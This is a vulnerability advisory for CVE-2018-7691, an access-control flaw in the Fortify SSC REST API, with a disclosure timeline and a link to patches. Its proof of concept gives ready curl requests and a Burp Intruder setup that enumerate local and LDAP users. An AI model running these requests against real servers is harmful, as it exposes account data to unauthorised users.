@@ -1,0 +1,185 @@
+Details
+================
+Software: Fortify SSC (Software Security Center)
+Version: 17.10, 17.20 & 18.10
+Homepage: https://www.microfocus.com
+Advisory report: https://github.com/alt3kx/CVE-2018-7691
+CVE: CVE-2018-7691
+CVSS: 6.5 (Medium; AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N)
+CWE-639
+
+Description
+================
+REST API contains Insecure direct object references (IDOR) allowing and extracting arbitrary details of the Local and LDAP users via POST method
+
+Vulnerability
+================
+Fortify SSC (Software Security Center) 17.10, does not properly check ownership of "authEntities", which allows remote authenticated (view-only) users
+to read arbitrary details via API bulk parameter to /api/v1/projectVersions/{NUMBER}/authEntities
+
+Note: View-only Role, is a restricted role, can view results, but cannot interfere with the issue triage or the remediation process.
+
+Proof of concept
+================
+
+Pre-requisites:
+
+- Curl command deployed (Windows or Linux)
+- jq command deployed (for parsing JSON fields), (Windows or Linux)
+- Burpsuite Free/Por deployed or any other Proxy to catch/send the request (optional)
+
+Step (1): LogOn into fortifyserver.com SSC (Software Security Center) 17.10 with your view-only role (restricted),
+
+The URL normally is avaiable as following:
+
+Target: https://fortifyserver.com/ssc/#/
+
+Step (2): Once logged extract the Cookie field, the format normally as following: "Cookie: JSESSIONID=69B1DBD72FCA8DB57C08B01655A07414;"
+Step (3): Start BurpSuite Free/Pro or any other HTTP proxy (optional) listen port 8080 as default
+
+Step (4): The offending POST is:
+
+POST /ssc/api/v1/bulk HTTP/1.1
+Host: fortifyserver.com
+Connection: close
+Accept: application/json, text/plain, */*
+X-Requested-With: XMLHttpRequest
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.89 Safari/537.36
+Content-Type: application/json;charset=UTF-8
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US,en;q=0.9
+Cookie: JSESSIONID=69B1DBD72FCA8DB57C08B01655A07414;
+Content-Length: 123
+
+{"requests":[{"uri":"https://fortifyserver.com/ssc/api/v1/projectVersions/3/authEntities","httpVerb":"GET"}]}\x0d\x0a
+
+Step (5): Test the first POST (to be included the cookie session) request and parsing the JSON data received using curl and jq commands as following:
+
+# curl -s -k -X POST https://fortifyserver.com/ssc/api/v1/bulk
+
+-H "Host: fortifyserver.com"
+-H "Connection: close"
+-H "Accept: application/json, text/plain, */*"
+-H "X-Requested-With: XMLHttpRequest"
+-H "User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.89 Safari/537.36"
+-H "Content-Type: application/json;charset=UTF-8"
+-H "Accept-Encoding: gzip, deflate"
+-H "Accept-Language: en-US,en;q=0.9"
+-H "Cookie: JSESSIONID=69B1DBD72FCA8DB57C08B01655A07414;"
+-b "JSESSIONID=69B1DBD72FCA8DB57C08B01655A07414;"
+--data-binary "{\"requests\":[{\"uri\":\"https://fortifyserver.com/ssc/api/v1/projectVersions/0/authEntities\",\"httpVerb\":\"GET\"}]}\x0d\x0a"
+--proxy http://127.0.0.1:8080 | jq '.data[] .responses[] .body .responseCode'
+
+You should see the following response:
+
+200
+
+Step (6): Now extract all local and LDAP users registered into Fortify SSC server:
+
+Payload:  /api/v1/projectVersions/{NUMBER}/authEntities, see the field "--data-binary" below and change the number as following:
+
+# curl -s -k -X POST https://fortifyserver.com/ssc/api/v1/bulk
+
+-H "Host: fortifyserver.com"
+-H "Connection: close"
+-H "Accept: application/json, text/plain, */*"
+-H "X-Requested-With: XMLHttpRequest"
+-H "User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.89 Safari/537.36"
+-H "Content-Type: application/json;charset=UTF-8"
+-H "Accept-Encoding: gzip, deflate"
+-H "Accept-Language: en-US,en;q=0.9"
+-H "Cookie: JSESSIONID=69B1DBD72FCA8DB57C08B01655A07414;"
+-b "JSESSIONID=69B1DBD72FCA8DB57C08B01655A07414;"
+--data-binary "{\"requests\":[{\"uri\":\"https://fortifyserver.com/ssc/api/v1/projectVersions/3/authEntities\",\"httpVerb\":\"GET\"}]}\x0d\x0a"
+--proxy http://127.0.0.1:8080 | jq '.data[] .responses[] .body .data[] .entityName'
+
+You should see the following response with users available
+
+"admin"
+"sca"
+"alex"
+
+[../snip]
+
+Step (7): Automate with BurpSuite Pro/Free choose:
+
+Payload Positions: "Intruder Tab -> Positions" highlight as following:
+
+-> /api/v1/projectVersions/§1§/authEntities
+
+Payloads set: "Intruder Tab -> Payloads" with the following data:
+
+-> Payload set: 1
+
+-> Payload type: Numbers
+
+Payload Options [Numbers]:
+
+-> Type: Sequential
+
+-> From: 0
+
+-> To: 1500
+
+-> Step: 1
+
+Then start attack…
+Have fun!
+
+Have fun!
+
+Mitigations
+================
+Install the latest patches availabe here:
+https://softwaresupport.softwaregrp.com/doc/KM03298201
+
+Disclosure policy
+================
+We believes in responsible disclosure.
+Please contact us on Alex Hernandez aka alt3kx  (at) protonmail com to acknowledge this report.
+
+This vulnerability will be published if we do not receive a response to this report with 10 days.
+
+Timeline
+================
+
+2018-05-24: Discovered
+2018-05-25: Retest PRO environment
+2018-05-31: Vendor notification, two issues found
+2018-05-31: Vendor feedback received
+2018-06-01: Internal communication
+2018-06-01: Vendor feedback, two issues are confirmed
+2018-06-05: Vendor notification, new issue found
+2018-06-06: Vendor feedback, evaluating High submission
+2018-06-08: Vendor feedback, High issue is confirmed
+2018-06-19: Researcher, reminder sent
+2018-06-22: Vendor feedback, summary of CVEs handled as official way
+2018-06-26: Vendor feedback, official Hotfix for High issue available to test
+2018-06-29: Researcher feedback
+2018-07-02: Researcher feedback
+2018-07-04: Researcher feedback, Hotfix tested on QA environment
+2018-07-05: Vendor feedback, fixes scheduled Aug/Sep 2018
+2018-08-02: Reminder to vendor, feedback received OK!
+2018-09-26: Reminder to vendor, feedback received OK!
+2018-09-26: Fixes received from the vendor
+2018-10-02: Internal QA environment failed, re-building researcher 's ecosystem
+2018-10-11: Internal QA environment failed, re-building researcher 's ecosystem
+2018-10-11: Feedback from the vendor, technical details provided to the researcher
+2018-10-16: Fixes now tested on QA environment
+2018-11-08: Reminder received from the vendor, feedback provided by researcher
+2018-11-09: Re-rest fixes on QA environment
+2018-11-15: Re-rest fixes on QA environment now with SSC 18.20 version deployed
+2018-11-21: Researcher feedback
+2018-11-23: Fixes working well/confirmed by researcher
+2018-11-23: Vendor feedback, final details to disclosure the CVE and official fixes available for customers.
+2018-11-26: Vendor feedback, CVE, and official fixes to be disclosure
+2018-11-26: Agreements with the vendor to publish the CVE/Advisory.
+2018-12-12: Public report
+
+Discovered by:
+Alex Hernandez aka alt3kx:
+================
+Please visit https://github.com/alt3kx for more information.
+
+My current exploit list @exploit-db:
+https://www.exploit-db.com/author/?a=1074 & https://www.exploit-db.com/author/?a=9576
